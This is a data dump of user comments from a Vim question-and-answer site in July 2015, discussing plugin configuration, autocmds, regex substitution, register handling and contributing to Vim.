  <row Id="5639" PostId="3927" Score="0" Text="I made it as a command, it's easier to run this way. It *should* work though, it just calls the original function with one argument. (I just retested it with a copy/paste on my machine and it runs alright)" CreationDate="2015-07-12T19:21:57.187" UserId="1800" />
  <row Id="5640" PostId="3927" Score="0" Text="Sorry, I missed that part. It works perfectly. Thanks!" CreationDate="2015-07-12T19:23:26.110" UserId="2804" />
  <row Id="5641" PostId="3927" Score="0" Text="You're welcome :)" CreationDate="2015-07-12T19:23:38.903" UserId="1800" />
  <row Id="5642" PostId="3928" Score="1" Text="That's nicer than the 2 lists I used, but it ignores the &quot;replace inside a label only&quot; requirement." CreationDate="2015-07-12T20:46:03.510" UserId="1800" />
  <row Id="5643" PostId="3852" Score="0" Text="@VanLaser I've updated my answer with a final version. It turns out that your original line counting method was fine, but there was a bug in Vim. I've submitted [a patch](https://groups.google.com/forum/#!msg/vim_dev/zX45zm-cnc0/-BWjjh5tlX8J) which [got accepted](https://groups.google.com/forum/#!msg/vim_dev/PnMWN0rujOk/hRxX91VZAc4J), so in the latest version of Vim, your answer will also work as intended." CreationDate="2015-07-12T21:25:00.063" UserId="2720" />
  <row Id="5644" PostId="3852" Score="0" Text="You seem to have done some real digging there (going to the source) - congratulations!" CreationDate="2015-07-12T21:52:53.167" UserId="1800" />
  <row Id="5645" PostId="3929" Score="0" Text="Should only the 1-character-width column of characters be deleted, or all text in between the current cursor position and the target character in the same column?" CreationDate="2015-07-13T00:59:46.423" UserId="2479" />
  <row Id="5647" PostId="3934" Score="1" Text="What kind of contribution do you have in mind?" CreationDate="2015-07-13T05:25:03.163" UserId="1577" />
  <row Id="5648" PostId="3934" Score="0" Text="I just want to support the development team as of now. Bug fixes, doing something out of their TODO list and i don't know what can a beginner like me is assigned to do." CreationDate="2015-07-13T05:27:09.317" UserId="2339" />
  <row Id="5649" PostId="3934" Score="2" Text="There is a [vim_dev](https://groups.google.com/forum/#!forum/vim_dev) group where you can post patches.  Beware however that Vim is a mature project, I don't think they're looking for beginner contributions at this point.  As a result, there are patches that have been floating around for a few _years_ without being merged." CreationDate="2015-07-13T07:07:31.730" UserId="1577" />
  <row Id="5651" PostId="3935" Score="0" Text="Why do you think adding two empty directories to `g:syntastic_c_include_dirs` will accomplish anything useful?" CreationDate="2015-07-13T09:30:46.983" UserId="1577" />
  <row Id="5652" PostId="3935" Score="0" Text="@lcd047 I mentioned properly referring to directory Locations starting with /home/username/directorylocation was mentioned." CreationDate="2015-07-13T09:32:31.493" UserId="2339" />
  <row Id="5653" PostId="3935" Score="0" Text="Right, you did.  What I'm asking is why do you think that's the &quot;proper&quot; way of doing it." CreationDate="2015-07-13T09:38:10.203" UserId="1577" />
  <row Id="5654" PostId="3935" Score="0" Text="https://github.com/scrooloose/syntastic/issues/70   I have referred to this link to understand it as the correct of way doing it. Please suggest, if you i need to add other options as well to get syntastic working properly." CreationDate="2015-07-13T10:04:48.947" UserId="2339" />
  <row Id="5655" PostId="3934" Score="3" Text="Alternatively, check out the neovim project: https://github.com/neovim/neovim/" CreationDate="2015-07-13T10:13:12.073" UserId="1296" />
  <row Id="5656" PostId="3934" Score="0" Text="@lcd047 Thanks a lot and who have submitted these patches that have been floating around and why have they submitted them even if they are not being merged." CreationDate="2015-07-13T10:20:04.947" UserId="2339" />
  <row Id="5657" PostId="3934" Score="0" Text="@PhilippFrank Thanks a lot to you too. Are the changes in the Vim project merged into NeoVim Just out of curiosity?" CreationDate="2015-07-13T10:20:08.413" UserId="2339" />
  <row Id="5658" PostId="3935" Score="0" Text="@lcd047 In additioon to that, I have tried the following as well by having seperate config file for syntastic and configuring it. Reference - http://stackoverflow.com/questions/16622992/including-header-files-recursively-for-syntastic. I am guessing that i am missing something fundamental." CreationDate="2015-07-13T10:49:58.863" UserId="2339" />
  <row Id="5659" PostId="3935" Score="0" Text="Excellent.  Now, can you tell the difference between what you did and what those other people did?" CreationDate="2015-07-13T10:51:47.507" UserId="1577" />
  <row Id="5660" PostId="3934" Score="1" Text="Yes, they are considered, not all make sense or are viable due to changed code, but basically neovim aims to keep up. See https://github.com/neovim/neovim/commits/master for the commits, the latest one just now is the inclusion of a vim patch." CreationDate="2015-07-13T10:51:57.647" UserId="1296" />
  <row Id="5661" PostId="3935" Score="0" Text="Please update your post in a way so that we can try to reproduce this problem. In this case, this would mean a minimal vimrc file (which only loads this plugin, and sets some basic settings) and a few C files which show the problem ..." CreationDate="2015-07-13T11:12:35.747" UserId="51" />
  <row Id="5662" PostId="3935" Score="0" Text="@lcd047 I still am not able to find a difference that might help solve this." CreationDate="2015-07-13T11:28:02.173" UserId="2339" />
  <row Id="5663" PostId="3935" Score="0" Text="@Carpetsmoker Have edited the question to reproduce the problem!" CreationDate="2015-07-13T11:28:20.617" UserId="2339" />
  <row Id="5665" PostId="3935" Score="0" Text="@lcd047 Me myself haven't used a empty string as a include directory, I have just put that and expected it to be self explanatory that i filled proper directory paths." CreationDate="2015-07-13T11:31:35.257" UserId="2339" />
  <row Id="5666" PostId="3935" Score="0" Text="What checker are you using?" CreationDate="2015-07-13T11:32:28.357" UserId="1577" />
  <row Id="5667" PostId="3935" Score="0" Text="I don't know what you mean by a a checker." CreationDate="2015-07-13T11:33:30.743" UserId="2339" />
  <row Id="5668" PostId="3935" Score="0" Text="Did you read the manual?  Syntastic doesn't do any syntax checks by itself, it just runs a number of external checkers against your files and shows you the results.  You're supposed to do some minimal configuration before using it, such as add the [recommended settings](https://github.com/scrooloose/syntastic#user-content-3-recommended-settings) to your vimrc, and set `g:syntastic_c_checkers`." CreationDate="2015-07-13T11:49:21.877" UserId="1577" />
  <row Id="5669" PostId="3935" Score="0" Text="@lcd047 Turns out it was not required to configure those c checkers. The problem was that the .vimrc in the root directory was not picked by my vim even though I was launching it from the root directory of the project. Now, all i need to do is to ensure vim to pick that .vimrc which solves all the problems." CreationDate="2015-07-13T12:02:56.697" UserId="2339" />
  <row Id="5670" PostId="3935" Score="0" Text="_Turns out it was not required to configure those c checkers._ - You are.  Don't bother reporting any problems if you don't." CreationDate="2015-07-13T12:06:55.510" UserId="1577" />
  <row Id="5671" PostId="3935" Score="0" Text="Let us [continue this discussion in chat](http://chat.stackexchange.com/rooms/25782/discussion-between-b1tchacked-and-lcd047)." CreationDate="2015-07-13T13:43:16.607" UserId="2339" />
  <row Id="5672" PostId="3923" Score="0" Text="@lcd047 (and @ others too): About the dictionnary used as an object, is it a common way to use vimscript? I haven't looked at a lot of vimscript code yet so I'm not really aware of what the good practices are, so is that generally a good idea to use vimscript as an object oriented language with this dictionnary trick or should I do that only in some particular cases? (I don't want to flood the comments but I'm not sure it is worth a dedicated question tho)" CreationDate="2015-07-13T14:47:13.783" UserId="1841" />
  <row Id="5673" PostId="3938" Score="0" Text="Thanks for a Complete answer and I am definitely not in the game to contribute to add something new but to keep Vim stable and fluid like it always has been." CreationDate="2015-07-13T17:15:04.523" UserId="2339" />
  <row Id="5674" PostId="3934" Score="0" Text="@lcd047 Please add your answer as well stating about the Patches that are not merged so that people would notice and i don't want them going into the comments unnoticed." CreationDate="2015-07-13T17:25:45.400" UserId="2339" />
  <row Id="5675" PostId="3923" Score="0" Text="@statox It's a conceptual scheme, thus OOP in Vim has the same uses and caveats as real OOP in other languages.  It's useful is you're creating objects to model the solution to a problem; it can really get you in a mess if you're creating objects to model the problem rather than the solution.  When done properly it can be invaluable for making things extensible.  So yes, I'd say using OOP is good practice, provided that you take your time to think things properly.  For small, one-time plugins you can get away just fine without OOP.  Then again, you can probably also get away without VimL." CreationDate="2015-07-13T17:53:38.367" UserId="1577" />
  <row Id="5676" PostId="3923" Score="0" Text="@lcd047: Ok that seems legit. I probably won't use it for what I'm doing now but I'll take a look at that soon. Thanks for your answers :-)" CreationDate="2015-07-13T17:58:05.933" UserId="1841" />
  <row Id="5677" PostId="3923" Score="0" Text="@statox From your description above, your problem is precisely one where I'd use OOP right from the beginning.  That's why I wrote all that blurb about classes. _shrug_" CreationDate="2015-07-13T18:24:37.850" UserId="1577" />
  <row Id="5678" PostId="3923" Score="0" Text="@lcd047: Oh I see, I'll take some time to re-think the whole thing then!" CreationDate="2015-07-13T18:33:01.137" UserId="1841" />
  <row Id="5681" PostId="3943" Score="1" Text="I'd have though ctrlp might support it... but apparently it's a [feature request](https://github.com/kien/ctrlp.vim/issues/629)." CreationDate="2015-07-14T04:58:04.970" UserId="205" />
  <row Id="5682" PostId="3945" Score="1" Text="You mean: instead of opening it with vim interactions/BlockInteraction.js +38 ?" CreationDate="2015-07-14T11:39:13.383" UserId="284" />
  <row Id="5683" PostId="3945" Score="1" Text="@Duikboot That doesn't generalize to opening multiple files." CreationDate="2015-07-14T13:28:43.437" UserId="8" />
  <row Id="5684" PostId="3945" Score="0" Text="`grep`, `awk` and something else for construct properly command line? Or looking/writing vim script for this task?" CreationDate="2015-07-14T13:47:07.477" UserId="1145" />
  <row Id="5685" PostId="3944" Score="0" Text="Someone somehow do something like this `let @+=&quot;blah-blah-blah&quot;`?&#xA;`let @+=` sets vim register `&quot;+` aka system clipboard. Look carefully your `.vimrc` and plugins scripts." CreationDate="2015-07-14T17:03:51.410" UserId="1145" />
  <row Id="5686" PostId="3950" Score="0" Text="This works great when &quot;i&quot; is the only character between cursor and the target. Consider: `abci\nhij`, when cursor in on `b`. two search for `i` is necessary to get to the target character since search is linewise." CreationDate="2015-07-14T20:18:02.970" UserId="2295" />
  <row Id="5687" PostId="3951" Score="1" Text="possible duplicate of [Can I delete an entire line, except the line break?](http://vi.stackexchange.com/questions/3105/can-i-delete-an-entire-line-except-the-line-break)" CreationDate="2015-07-14T20:37:59.507" UserId="865" />
  <row Id="5688" PostId="3951" Score="1" Text="it is not a duplicate, as I said I want a more efficient way then going to beginning of line, also I actually want to remove the complete line with the newline character....not just the contents of the line" CreationDate="2015-07-14T20:42:10.947" UserId="1305" />
  <row Id="5689" PostId="3951" Score="0" Text="Oh, I do see what you mean now.  It just wasn't very clear to me what you were trying to accomplish." CreationDate="2015-07-14T20:48:40.173" UserId="865" />
  <row Id="5690" PostId="3950" Score="0" Text="If you want to &quot;delete from the current position to the next instance of i on another line starting on the current column&quot; then just stick a j after the &lt;C-v&gt;." CreationDate="2015-07-14T20:56:16.627" UserId="859" />
  <row Id="5691" PostId="3932" Score="0" Text="`columnmove-f` may be remapped in order to achieve things like `d&lt;m-f&gt;i` to delete along the column until the `i` character. I.e., one can do `omap &lt;m-f&gt;  &lt;c-v&gt;&lt;plug&gt;(columnmove-f)` (and similar for the other motions). I find this to be quite useful." CreationDate="2015-07-14T21:18:24.260" UserId="21" />
  <row Id="5692" PostId="3951" Score="0" Text="`0D` delete line except line break. And than `gJ` to join lines. Now you can put the text without break line and no empty line." CreationDate="2015-07-14T22:02:27.753" UserId="1145" />
  <row Id="5693" PostId="1906" Score="1" Text="The matching for the bonus points does not check if `java_highlight_functions` has been enabled. If you are neurotic about consistency, you should probably check it before the `syn match` call:&#xA;&#xA;`if exists(&quot;java_highlight_functions&quot;) | syn match javaFuncDef &quot;[^-]-&gt;&quot; | endif`" CreationDate="2015-07-14T23:25:57.153" UserId="2832" />
  <row Id="5694" PostId="3956" Score="0" Text="You might want to use `normal!` with the exclamation mark, in order to use only internal vim commands and not commands defined by yourself (or others). Although, it seems as if your first executed normal mode command uses a command (`:H`) that either you or someone else defined (e.g. in a plugin). Your last normal mode command should use the exclamation mark, at least." CreationDate="2015-07-15T21:06:20.690" UserId="21" />
  <row Id="5695" PostId="3957" Score="0" Text="Without exec and without normal? I tried this: `exec '%s/(, /(/g'`, and this: `'%s/(, /(/g'`, and this: `%s/(, /(/g`. But nothing works. `E486: Pattern not found: (, `" CreationDate="2015-07-15T21:29:13.130" UserId="2848" />
  <row Id="5696" PostId="3957" Score="0" Text="I updated the question to explain what the function needs to do." CreationDate="2015-07-15T21:37:23.167" UserId="2848" />
  <row Id="5697" PostId="3956" Score="0" Text="I updated the question to explain what the function needs to do." CreationDate="2015-07-15T21:37:26.217" UserId="2848" />
  <row Id="5698" PostId="3961" Score="0" Text="Thanks, I had no idea about those limitations." CreationDate="2015-07-16T01:34:06.657" UserId="584" />
  <row Id="5699" PostId="3962" Score="2" Text="Possibly useful: http://lardcave.net/text/Highlighting%20arbitrary%20lines%20in%20Vim.html" CreationDate="2015-07-16T03:07:36.167" UserId="205" />
  <row Id="5700" PostId="3898" Score="1" Text="I think it will be nice to include `BufEnter` event into this list (to change label even when we switch between existing buffers), and something like this `autocmd VimLeave * call system(&quot;tmux rename-window 'tmux'&quot;)` for cleanup." CreationDate="2015-07-16T04:02:26.973" UserId="30" />
  <row Id="5701" PostId="3957" Score="1" Text="On a side note: always use &quot;magicness&quot; qualifiers for regexps in scripts: `%s/\m(, /(/g`.  The very fact that the `magic` option changes the semantics of regexps (yet it still can't make regexps &quot;very magic&quot;) means we have to litter our regexps with `\m` or `\v` everywhere, for ever and ever, happily ever after." CreationDate="2015-07-16T04:35:30.667" UserId="1577" />
  <row Id="5702" PostId="3957" Score="0" Text="I updated the answer slightly: I agree with @lcd047 that the `\m` option should be present. Further, since the pattern was not found, the substitute was not necessary. In this case, we simply ignore errors, so I added the `e` flag." CreationDate="2015-07-16T07:33:04.993" UserId="21" />
  <row Id="5703" PostId="3956" Score="0" Text="Your first `exec` command performs four or five edits: I suggest you split the command into the separate edits, instead of having one command doing all of them. This will help greatly in locating errors." CreationDate="2015-07-16T07:34:28.913" UserId="21" />
  <row Id="5704" PostId="3964" Score="0" Text="I have installed vim-airline and `timeoutlen`, `ttimeoutlen` and `esckeys` is default (`timeoutlen=1000 ttimeoutlen=-1 esckeys timeout nottimeout`) and have no any problems, and no delay after exiting insert mode. By the way `:he timeoutlen`, `:he timeout`, `:he esckeys` should explain you I hope." CreationDate="2015-07-16T09:29:54.800" UserId="1145" />
  <row Id="5705" PostId="3962" Score="0" Text="What about `matchaddpos()`?  That allows you to highlight arbitrary areas of text." CreationDate="2015-07-16T13:16:07.457" UserId="865" />
  <row Id="5706" PostId="3962" Score="0" Text="@EvergreenTree `matchaddpos()` has the same limitation as `match`, it was broken until recently, it has a horrendous syntax, and it can handle at most 8 lines.  To highlight lines 3-5 you need to do it like this: `call matchaddpos('FleetingFlashyFiretrucks', [[3], [4], [5]])`.  Really, it isn't one of Vim's best features." CreationDate="2015-07-16T18:04:23.140" UserId="1577" />
  <row Id="5707" PostId="3957" Score="1" Text="@RafaelSoufraz `Pattern not found` is very different from `Missing quote` and `Invalid expression`. It sounds like Karl's answer solved the problem you were asking about. If you expect to find that pattern and are surprised that you don't, then that's a different question–the command seems to execute correctly." CreationDate="2015-07-16T18:20:22.873" UserId="1306" />
  <row Id="5708" PostId="3957" Score="0" Text="Ok.. I'll open another thread. Thanks." CreationDate="2015-07-16T18:41:09.973" UserId="2848" />
  <row Id="5709" PostId="3967" Score="0" Text="Ah, it's even in the help file for global. How silly I am. Thank you" CreationDate="2015-07-17T02:30:49.817" UserId="130" />
  <row Id="5710" PostId="3966" Score="1" Text="On a side note: you can also do it like this: `:%s/$/\r/`, or like this: `:%s/\n/\r\r/`.  The takeaway is that newlines can be matched with `\n`, but have to be written as `\r` in replacement values." CreationDate="2015-07-17T05:07:16.803" UserId="1577" />
  <row Id="5711" PostId="3965" Score="0" Text="Maybe there's an error in the snippet file you created (I don't know if there is, since you didn't post it ;-) )" CreationDate="2015-07-17T07:28:39.377" UserId="51" />
  <row Id="5714" PostId="3971" Score="0" Text="What if I want to run this on all the files that are currently open, i.e. I execute :wa?" CreationDate="2015-07-17T15:30:13.733" UserId="2865" />
  <row Id="5715" PostId="3971" Score="0" Text="If the files were opened with the correct filetype, the `FileType` autocmd in the answer would have already set up the second autocmd (`BufWritePre`) to fire when you save them." CreationDate="2015-07-17T15:41:25.273" UserId="1800" />
  <row Id="5716" PostId="3971" Score="0" Text="I need some clarification. Let's say I have multiple open unsaved buffers, buf1, buf2 and buf3. All of them have trailing spaces. I'm currently working on buf3. If I save buf3  the autocmd will be executed in buf3. Here is my question: Will it be executed on buf1 and on buf2? Based on the documentation from autocmd-buflocal it seems like that it won't" CreationDate="2015-07-17T15:46:42.513" UserId="2865" />
  <row Id="5717" PostId="3971" Score="1" Text="The `FileType` autocmd above will fire for *every* file you open with the correct filetype, and will setup a *buffer-local* event for *each* of those files. So if you run `:wa`, vim will run registered events for each buffer, before saving to file." CreationDate="2015-07-17T15:48:28.120" UserId="1800" />
  <row Id="5718" PostId="3971" Score="0" Text="(... and if you run `:w`, the event will run only for the current buffer)" CreationDate="2015-07-17T15:58:05.787" UserId="1800" />
  <row Id="5719" PostId="3972" Score="0" Text="Why not just do `set tabstop=2 softtabstop=2 shiftwidth=2`?   That will apply for all filetypes when put in your vimrc, unless an ftplugin overrides it." CreationDate="2015-07-17T16:01:47.180" UserId="865" />
  <row Id="5720" PostId="3972" Score="0" Text="Looks like I forgot to add expandtab to the original code. I've just done the edit. That is what my concern. Expand the tabs in every file except when it is make." CreationDate="2015-07-17T16:11:01.143" UserId="2865" />
  <row Id="5721" PostId="3972" Score="0" Text="As @EvergreenTree suggested, just put `set expandtab` in your vimrc and do not put `setlocal expandtab` in your FileType autocommand." CreationDate="2015-07-17T16:36:52.537" UserId="2055" />
  <row Id="5722" PostId="3971" Score="1" Text="So if you open 5 Python files you'll have 5 `autocmd`s instead of a single one, all on write.  Then if, say, 3 of these files get hidden, then get shown again, `FileType` gets re-triggered so you get 3 more `autocmd`s, also on write.  This is brilliant, I wonder why I didn't come up with this solution. :)" CreationDate="2015-07-17T16:59:27.947" UserId="1577" />
  <row Id="5723" PostId="3971" Score="0" Text="@lcd047: Really? If you do all that and notice a performance degradation, let me know." CreationDate="2015-07-17T17:21:01.170" UserId="2055" />
  <row Id="5724" PostId="3971" Score="1" Text="Performance is not a problem.  Running the function `stripTrailingWhiteSpaces()` several times against the same file might have unintended consequences though.  Also, the more `autocmd`s you have for the same event for the same file, the more likely you are to run into some really race conditions.  Try searching vim_dev archives to get an idea.  Then again, what do I know, it might just work for you, right?" CreationDate="2015-07-17T17:34:41.997" UserId="1577" />
  <row Id="5725" PostId="3972" Score="0" Text="@EvergreenTree Can you post an answer so I could accept it and upvote it. Your suggestion worked." CreationDate="2015-07-17T18:11:50.390" UserId="2865" />
  <row Id="5726" PostId="3973" Score="0" Text="What have I done to deserve a downvote?" CreationDate="2015-07-17T18:19:59.253" UserId="2865" />
  <row Id="5727" PostId="3974" Score="0" Text="My tabstop, shiftwidth and softtabstop are all set to 4. &#xA;Clearly my understanding of tabstop is wrong even after reading help for tabstop. Would you mind clarifying your answer. Even after reading help for tabstop, I still don't see what I'm doing wrong." CreationDate="2015-07-17T18:33:43.230" UserId="2865" />
  <row Id="5728" PostId="3971" Score="0" Text="@lcd047 I don't work with very large files, so this works for me." CreationDate="2015-07-17T18:37:55.820" UserId="2865" />
  <row Id="5729" PostId="3976" Score="0" Text="I thought when I set my tabstop to 4 I tell vim to use 4 spaces for a tab. And when I set my listchar character to tab:►-, it will fill the first space with ►, and the other spaces with - . My interpretation seems to be incorrect. Am I correct in understanding that there tab character doesn't occupy the same number of spaces every time? If yes, then how do I know how many spaces it occupies in a given instance?" CreationDate="2015-07-17T20:42:28.353" UserId="2865" />
  <row Id="5730" PostId="3976" Score="0" Text="The tab character never occupies even one space. The string used by Vim to materialize tabulations, on the other hand, is of variable width: `►` followed by as many `-` as necessary (7 with the default `ts`, 3 if you set it to 4...). My answer is likely to be the most comprehensive you will ever get to *this* question. If unsure about the value of `tabstop` for your makefiles do `:echo &amp;tabstop`. If you are not satisfied with your current settings, look around this site or stack overflow for &quot;filetype specific settings&quot;. Or ask another more specific question, **with your actual settings.**" CreationDate="2015-07-17T20:59:39.360" UserId="54" />
  <row Id="5731" PostId="3965" Score="0" Text="Hi @Carpetsmoker , I've posted my snippets." CreationDate="2015-07-18T02:22:11.463" UserId="1276" />
  <row Id="5732" PostId="3978" Score="0" Text="Related: http://stackoverflow.com/q/6952636/2072269 (no answer given that can be used after you have *already* done a resize)." CreationDate="2015-07-18T03:20:31.330" UserId="205" />
  <row Id="5733" PostId="3978" Score="0" Text="@muru: nice, but that's for this specific case. What if I've done something like `fz` and then `10;`? What about `:tabm +1`? Are these all going to have to be special-cased?" CreationDate="2015-07-18T03:23:51.133" UserId="142" />
  <row Id="5734" PostId="3978" Score="0" Text="I think you misunderstood me. I'm saying the linked post has useless answers (before somebody else comes and suggests it)." CreationDate="2015-07-18T03:25:06.457" UserId="205" />
  <row Id="5735" PostId="3978" Score="0" Text="oh! okay, then we're on the same page @muru :)" CreationDate="2015-07-18T03:36:42.600" UserId="142" />
  <row Id="5736" PostId="3971" Score="0" Text="(perhaps using `augroup` with an initial `autocmd!` would solve all problems)" CreationDate="2015-07-18T15:04:09.943" UserId="1800" />
  <row Id="5737" PostId="3980" Score="1" Text="I'm sorry, but I can't help with Vim-LaTeX. However, I do develop my own LaTeX-plugin: [vimtex](https://github.com/lervag/vimtex), which I personally think is getting pretty good. There is also several other good ones (IMHO), e.g. [LaTeX-Box](https://github.com/LaTeX-Box-Team/LaTeX-Box), [atp](http://atp-vim.sourceforge.net/) and [vim-latex-live-preview](https://github.com/xuhdev/vim-latex-live-preview)." CreationDate="2015-07-18T16:23:21.163" UserId="21" />
  <row Id="5738" PostId="3971" Score="0" Text="@VanLaser: That's a good idea. I'll try that and post and update. lcd047's answer had a good approach, too. It's a shame he deleted it. I was just trying for an answer that was a simple, direct solution to the original problem. It's expensive to give answers that aren't perfect." CreationDate="2015-07-18T16:42:05.800" UserId="2055" />
  <row Id="5739" PostId="3971" Score="0" Text="It's the 'point based system' - people giving answers should be encouraged to collaborate between them, not compete. And perfect answers (which are then simply copy-pasted in a `vimrc`) don't help so much as a short *incomplete* answer which makes the user sweat a little (which is the real help)." CreationDate="2015-07-18T16:54:35.393" UserId="1800" />
  <row Id="5740" PostId="3980" Score="0" Text="Perhaps ask on [tex.se], you might find somebody there that has it at hand." CreationDate="2015-07-18T17:39:52.237" UserId="1577" />
  <row Id="5741" PostId="3980" Score="0" Text="There is some information in the help (`:help recommended-settings`) and a lot in the &quot;texrc&quot; file included with the plugin (`vim-latex/ftplugin/latex-suite/texrc`). Are you looking for something beyond these?" CreationDate="2015-07-18T17:50:33.483" UserId="1306" />
  <row Id="5742" PostId="3983" Score="1" Text="@Emre That's the `recommended-settings` section from the help, which you should have if you have installed the plugin. Is it what you are looking for?" CreationDate="2015-07-18T18:17:43.597" UserId="1306" />
  <row Id="5743" PostId="3986" Score="0" Text="Awesome! I just figured it out too. The getting command line options is something I hadn't figured out too.&#xA;&#xA;I ended up having to remap a single string command to the &quot;wincmd J&quot; as well." CreationDate="2015-07-19T03:20:24.857" UserId="2888" />
  <row Id="5744" PostId="3983" Score="0" Text="Yes that's it! I misinterpreted the paragraph preceding it to mean that there was more on the vimrc file on Sourceforge. Thanks a lot, both the answer and the comment have been illuminating." CreationDate="2015-07-19T04:52:03.947" UserId="2882" />
  <row Id="5745" PostId="3986" Score="1" Text="Looking at `/proc` is specific to Linux, some systems don't even have a `/proc`.  A more portable way to find out what `git mergetool` does is to use a wrapper script that writes its arguments to a file and `exec`s Vim, and point `mergetool` to the script." CreationDate="2015-07-19T12:58:35.453" UserId="1577" />
  <row Id="5746" PostId="3988" Score="0" Text="Nice (+1). - Have you an idea why the macros don't work if in line 1 of the data file?" CreationDate="2015-07-19T12:58:43.477" UserId="2479" />
  <row Id="5747" PostId="3988" Score="0" Text="@Janis Apparently the `&lt;C-u&gt;` didn't work the way I imagined it.  Without it the macros work from everywhere (well, hopefully), but they no longer take a count.  I'm not sure I understand why though." CreationDate="2015-07-19T13:13:51.363" UserId="1577" />
  <row Id="5748" PostId="3986" Score="0" Text="@lcd047 nice idea. Updated." CreationDate="2015-07-19T13:21:55.893" UserId="205" />
  <row Id="5751" PostId="3988" Score="0" Text="@Janis I found a version that accepts counters, but it seems unnecessarily complicated. _shrug_" CreationDate="2015-07-19T14:04:28.777" UserId="1577" />
  <row Id="5752" PostId="3992" Score="2" Text="I've been happy with Ingo Karkat's SpellCheck.vim plugin, available at https://github.com/vim-scripts/SpellCheck and normally at http://www.vim.org/scripts/script.php?script_id=3844, except that vim.org is down at the moment." CreationDate="2015-07-20T05:34:51.793" UserId="2055" />
  <row Id="5754" PostId="3965" Score="0" Text="garbas FAQ: [SnipMate doesn't work / My snippets aren't triggering](https://github.com/garbas/vim-snipmate#faq)" CreationDate="2015-07-20T07:09:46.610" UserId="1145" />
  <row Id="5756" PostId="3993" Score="0" Text="It would be one thing if you were writing the content yourself, but modifying copy-pasted content on the fly... No, I'd suggest you use code-formatting." CreationDate="2015-07-20T07:13:51.520" UserId="205" />
  <row Id="5757" PostId="3998" Score="5" Text="Here we go again: don't use assignments to save and restore registers, you'll lose all information about the registers' types.  Use `getreg()`, `getregtype()`, and `setreg()` instead." CreationDate="2015-07-20T07:47:35.833" UserId="1577" />
  <row Id="5758" PostId="3994" Score="0" Text="Hmm, I think you meant ` \n` and not `\n `. In Markdown, contiguous lines form a paragraph and get wrapped, unless a) they are in a code block, list or other such special environment or b) a line ends with two spaces `foo__$`. Though it doesn't have to be as complicated as you make it out: `:s/$/  /` should be enough. The problem is doing it to pasted content automatically." CreationDate="2015-07-20T07:49:11.117" UserId="205" />
  <row Id="5759" PostId="3995" Score="0" Text="I'm curious about the downvotes, can you please explain?  Thanks in advance!" CreationDate="2015-07-20T10:00:59.663" UserId="1577" />
  <row Id="5760" PostId="3993" Score="1" Text="The fact that newlines are ignored is also considered a *feature*, since it allows you to wrap your source document to 78 characters, and still format it differently. Learn to love it :-)" CreationDate="2015-07-20T10:04:08.597" UserId="51" />
  <row Id="5764" PostId="3999" Score="0" Text="Indeed, I find it *very* strange you associating the issue with jedi when not using that plugin doesn't make any difference. O.o" CreationDate="2015-07-20T11:02:26.037" UserId="205" />
  <row Id="5765" PostId="3999" Score="0" Text="@muru --- I have no problem if I comment out the `Plug 'davidhalter/jedi-vim` line in `-vimrc` --- maybe I explained myself badly. Sorry..." CreationDate="2015-07-20T11:20:32.230" UserId="854" />
  <row Id="5766" PostId="3999" Score="1" Text="Oh, I suppose then I misread: *I checked that commenting out the plugin will remove the problem. Even adding let g:jedi#auto_initialization = 0 will not solve the problem...* It seemed like the last clause applied to both sentences." CreationDate="2015-07-20T11:21:24.503" UserId="205" />
  <row Id="5767" PostId="4001" Score="0" Text="Ok, that fixed. But I am sure it show on when `jedi-vim` is enabled; it probably set the `conceallevel` to something different from 0 at startuo. Thanks!" CreationDate="2015-07-20T11:27:17.393" UserId="854" />
  <row Id="5768" PostId="4001" Score="0" Text="@Rmano Now that you mention it, yes, `jedi-vim` does set `conceallevel`, but only locally, for `python` buffers.  It should have nothing to do with `latex` buffers." CreationDate="2015-07-20T11:56:53.427" UserId="1577" />
  <row Id="5769" PostId="4001" Score="0" Text="Yep, I see --- it's in `.../plugged/jedi-vim/after/python.vim`. I do not know why it is triggered for the latex files. Puzzled." CreationDate="2015-07-20T12:40:59.150" UserId="854" />
  <row Id="5770" PostId="4001" Score="1" Text="@Rmano It's a lot more likely that a `latex`-related plugin sets `conceallevel` than `jedi-vim`.  To find out where `conceallevel` has been set, open a `latex` file and run `:verbose set conceallevel?`." CreationDate="2015-07-20T12:45:27.820" UserId="1577" />
  <row Id="5771" PostId="4001" Score="0" Text="I updated the question --- that file is actually read when I open a `.tex` buffer. Maybe some kind of sub-syntax editing for listing environment? No idea. Thanks anyway!" CreationDate="2015-07-20T12:56:47.160" UserId="854" />
  <row Id="5772" PostId="4001" Score="0" Text="To find out where the problem __was__ you need to remove the `autocmd` so that the problem comes up again, __then__ open a `latex` file and run the `:verbose` thing again.  On a side note: use a `ftplugin` instead of an `autocmd`.  If you people knew how truly bad these things really are under the hood, you'd avoid them like the pest." CreationDate="2015-07-20T13:00:05.353" UserId="1577" />
  <row Id="5773" PostId="4001" Score="0" Text="Yes, this is what I did. I think that the problem is that `vimtex` loads syntax highlighting for nested &quot;listing&quot; environment, see [here](https://github.com/lervag/vimtex/blob/master/after/syntax/tex.vim) from line 66 onward." CreationDate="2015-07-20T13:02:38.030" UserId="854" />
  <row Id="5774" PostId="4001" Score="0" Text="@Rmano So, where does `verbose` says `conceallevel` comes from?" CreationDate="2015-07-20T13:03:38.293" UserId="1577" />
  <row Id="5775" PostId="4001" Score="0" Text="@lcd047 it comes from jedi-vim's `after/syntax/python.vim` (which gets &quot;forcefully&quot; loaded for `.tex` buffers by the plugin.  I wonder if moving the `set conceallevel` out of the syntax file makes sense?  At least it would fix this issue probably.  Does it better fit into the `ftplugin`?" CreationDate="2015-07-20T13:13:43.880" UserId="2899" />
  <row Id="5776" PostId="4001" Score="1" Text="@Rmano Now this is something you could ask the `jedi-vim` guys: why does `after/syntax/python.vim` get run for `latex` files?" CreationDate="2015-07-20T13:17:50.317" UserId="1577" />
  <row Id="5777" PostId="4001" Score="0" Text="@lcd047 --- yep. Continuing in https://github.com/davidhalter/jedi-vim/issues/440" CreationDate="2015-07-20T13:51:50.980" UserId="854" />
  <row Id="5778" PostId="3944" Score="0" Text="*&quot;I know, vim -u NONE, remove plugins one by one... Just thought maybe somebody knows what's causing it.&quot;* -&gt; So did this fix it?" CreationDate="2015-07-20T14:37:54.890" UserId="51" />
  <row Id="5779" PostId="3944" Score="0" Text="Haven't tried yet." CreationDate="2015-07-20T14:39:37.957" UserId="237" />
  <row Id="5780" PostId="3907" Score="0" Text="The `&lt;Esc&gt;` or `&lt;C-]&gt;` sequence is called during startup, for sending information to the terminal. Remapping `&lt;C-[&gt;` is something that should be an error when running in a terminal, IMHO." CreationDate="2015-07-20T14:45:35.593" UserId="51" />
